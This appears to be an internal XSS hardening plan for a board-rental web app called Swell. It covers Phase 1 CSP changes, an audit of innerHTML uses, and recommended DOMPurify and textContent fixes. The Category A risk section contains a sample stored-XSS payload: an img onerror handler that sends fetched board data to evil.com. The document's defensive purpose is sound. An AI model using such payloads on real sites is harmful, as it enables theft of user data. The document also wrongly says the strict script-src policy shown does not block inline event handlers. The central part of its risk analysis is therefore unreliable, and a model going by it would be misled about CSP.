# XSS Hardening Plan — Swell

## Status: Phase 1 Complete (2026-05-28)

### What was done in Phase 1

- **CSP enabled via Helmet** (`server.js`) — `contentSecurityPolicy: false` removed
- **Nonce-based CSP** for all server-rendered pages (`/spot/:slug`, `/board/:id`, `/listings`)
  - Per-request random nonce injected into inline `<script>` blocks via `res.locals.cspNonce`
  - CSP meta tag added to all server-rendered pages
  - `style-src 'unsafe-inline'` required for inline `<style>` blocks in spot-pages.js (1,400+ lines)
- **Static CSP header** set for `app.html` and all static HTML files via `express.static` middleware
  - `script-src 'self'`, `style-src 'self' 'unsafe-inline'` (unsafe-inline needed for app.html inline styles)
- **Server.js refactored** — `/listings` route extracted to `routes/listings.js` (was 343 lines → 245 lines)

---

## What CSP Now Blocks

| Attack | Blocked? | How |
|--------|----------|-----|
| Injected `<script>` tags in board titles/descriptions | ✅ YES | `script-src 'self'` — no inline scripts allowed without nonce |
| Stored XSS via board metadata on server-rendered pages | ✅ YES | `esc()` used on all user data in server-rendered pages; nonce prevents script tag execution |
| `<script>` injection in JSON-LD blocks | ✅ YES | Nonce on inline `<script type="application/ld+json">` blocks |
| CSP bypass via data: URIs | ✅ YES | `img-src` explicitly lists allowed sources; data: only for img |

---

## Remaining Attack Surface

### Phase 2 — app.html innerHTML Audit

`app.html` has **75 innerHTML usages**. With the strict CSP now active, injected `<script>` tags cannot execute. However, **event handler attributes** (e.g., `onerror`, `onload`, `onclick` injected in user data) could still fire — CSP does not block attribute-based injection.

#### Category A — USER-CONTROLLED DATA (HIGH RISK)

Rendered from API responses (`/api/boards`, `/api/bookings`, `/api/messages`):

| Line(s) | Element | Data Source | Injection Vector |
|---------|---------|------------|-----------------|
| 2365 | `#boards-grid` | `board.title` | `<div class="board-title">${board.title}</div>` — board title injected as text content |
| 2488, 2509 | `#detail-body` | Board JSON | Skeleton then board data rendered |
| 2580 | `#detail-body` | Board JSON | Board detail with photos, title, host info |
| 2820–3400 | `#detail-body` | Board JSON | Full board detail with booking form |
| 4853, 4860 | `#bookings-panel .content` | Bookings API | Booking cards with board titles |
| 4899, 4906 | `#trips-tab .content` | Bookings API | Trip history with board names |
| 4946, 4953 | `#requests-tab .content` | Bookings API | Booking requests |
| 4987, 4999 | `#messages-tab .content` | Messages API | Conversation list with user names |
| 5024 | `#messages-tab .content` | Messages API | Message bubbles with sender names and content |
| 5100, 5165 | `#profile-tab .content` | Profile API | Profile display with name, bio |
| 5223 | `#payment-status` | Payment API | Payment status display |
| 5561, 5576 | `.content` (booking detail) | Booking API | Booking confirmation details |
| 5608 | `#chat-messages` | Messages API | Message content from other users |
| 5650 | `.bubble` | Messages API | **Highest risk**: message content from arbitrary users |
| 5743 | `#spot-filters` | Spots API | Spot names and wave types in filter pills |
| 5831 | `#spot-filters` | Spots API | Spot filter pills (same data) |
| 5938, 5944, 5947 | `#board-form .body` | Form state | Board listing form preview |
| 6086, 6095 | `.content` (inspections) | Inspections API | Check-in/out photo display |
| 6161, 6184 | `.content` (board form) | Form state | Board listing editor |
| 6413, 6444, 6453 | `#edit-modal-body` | Board API | Edit board form with user data |
| 6658 | `#host-stats` | Host metrics | Stats display |

**Risk**: A malicious user could set their board title to `<img src=x onerror="fetch('/api/boards').then(r=>r.json()).then(data=>location='https://evil.com/?data='+encodeURIComponent(JSON.stringify(data))))">`. This would:
1. Be fetched as board data by the API (no server-side sanitization)
2. Returned to any visitor browsing boards
3. Rendered via innerHTML
4. **CSP blocks `<script>` execution** — this vector is neutralized
5. But: the `onerror` attribute on `<img>` **would still fire** — CSP `script-src` does not block inline event handlers

**Mitigation needed**: Replace innerHTML with `textContent` for text nodes, or use a sanitizer (DOMPurify) for HTML fragments.

#### Category B — SAFE (Static / Non-User Data)

| Line(s) | Element | Why Safe |
|---------|---------|----------|
| 2202, 2217 | `.day-content` | Hardcoded CSS class names only |
| 2331 | `#boards-grid` | Static skeleton HTML, no user data |
| 2356 | `#boards-grid` | Static empty state message |
| 2529 | `#detail-body` | Static error message |
| 2795 | `#slot-pills` | Generated from time slot data, no user names |
| 2801 | `#slot-pills` | Empty state |
| 2866 | `#recap-body` | Static template with hardcoded labels |
| 3032 | `.promo-row` | Uses `_promoState?.discountPct` (numeric only) |
| 3190 | `#calendar-container` | Static loading skeleton |
| 3294, 3303, 3321 | `#duration-display` | Dynamic but numeric only (hours, prices) |
| 3331, 3334 | `#slot-availability` | Static text + slot descriptions (no user content) |
| 3382 | `.deposit-label` | Static label |
| 3458 | `.content` (board form) | Generated from form state, not user-submitted text |
| 3586 | `#calendar-container` | Static loading |
| 3613 | `#calendar-container` | Static error |
| 3657 | `#calendar-container` | Static template |
| 4375 | `#spot-select` | Static option strings |
| 4415, 4597, 4603 | `.modal-grid`, `.modal-grid`, `#edit-photo-grid` | Static empty or generated from file array |
| 4611 | `.remove-btn` | Hardcoded `×` character |
| 4649, 4653, 4657 | `.photo-label` | Numeric counter, no user text |
| 4694 | `.deposit-info` | Static text with numeric `dep.toFixed(0)` |
| 5369 | `.modal-body` | Static skeleton |
| 6421 | `#edit-modal-body` | Static skeleton |
| 6521 | `#edit-modal-body` | Static template, no user data |

#### Category C — MIXED (Static shell, user data in attributes)

| Line(s) | Why Mixed |
|---------|----------|
| 2380–2410 | Shell HTML is static, but `board.title`, `board.host_name`, `board.spot_name` are user data injected as text nodes. **CSP blocks script execution, but event handlers in these values would fire.** |
| 3905 | Static template but uses `currentUser.name` (user-controlled) |
| 5938–5988 | Board listing form with board title/description/location fields — all user-controlled |

---

## Phase 2 Recommendations

### Priority 1: Fix message rendering (Line 5650)
The chat/messages tab renders arbitrary user content. This is the highest-risk surface because any user can send a message with malicious HTML.

**Fix**: Replace message `innerHTML` with DOMPurify + textContent for text, or sanitize before insertion:
```javascript
const sanitized = DOMPurify.sanitize(message.content, { RETURN_TRUSTED_TYPE: false });
msgDiv.innerHTML = `<div class="bubble">${sanitized}</div>`;
```
Alternatively, use `textContent` for text nodes and only allow specific tags.

### Priority 2: Fix board card rendering (Line 2365)
Board titles from the API are rendered into HTML. These come from the database where hosts set titles.

**Fix**: Use `textContent` for text nodes, or sanitize with DOMPurify:
```javascript
// Instead of: div.innerHTML = `<div>${board.title}</div>`;
// Do:
const div = document.createElement('div');
const title = document.createElement('div');
title.className = 'board-title';
title.textContent = board.title; // safe — no HTML interpreted
div.appendChild(title);
grid.appendChild(div);
```

### Priority 3: Fix profile/bio rendering (Line 5100)
User bios are rendered as innerHTML. Bios are text fields.

**Fix**: Use `textContent` or sanitize with DOMPurify.

### Priority 4: Board listing form preview (Line 5938–5988)
When users type board titles/descriptions in the form, the preview renders them via innerHTML.

**Fix**: Use `textContent` for all text fields in the preview.

### Long-term: Migrate innerHTML to safe patterns
Replace all user-data innerHTML with:
1. `textContent` for plain text nodes (board titles, host names, spot names)
2. `DOMPurify.sanitize()` for permitted HTML (descriptions with basic formatting)
3. Template elements for complex structures

---

## CSP Directive Summary (Current)

```
default-src 'self';
script-src 'self' 'nonce-<per-request>';   // nonce for server-rendered inline scripts
style-src 'self' 'unsafe-inline';           // required for spot-pages.js and app.html inline styles
img-src 'self' data: https: blob:;
font-src 'self' https://fonts.gstatic.com;
connect-src 'self';
frame-src 'none';
object-src 'none';
upgrade-insecure-requests;
```

---

## Files Changed (Phase 1)

| File | Change |
|------|--------|
| `server.js` | Added CSP nonce middleware, enabled helmet CSP, added static CSP header for HTML files, extracted `/listings` to `routes/listings.js` |
| `routes/spot-pages.js` | Added CSP meta tag with nonce to renderSpotPage, nonce passed from route |
| `routes/seo.js` | Added nonce param to `renderBoardDetailPage`, added CSP meta tag |
| `routes/listings.js` | New file — extracted from server.js |

---

*Phase 2: Replace user-data innerHTML with textContent/DOMPurify. Target: Q3 2026 or before user growth reaches critical mass.*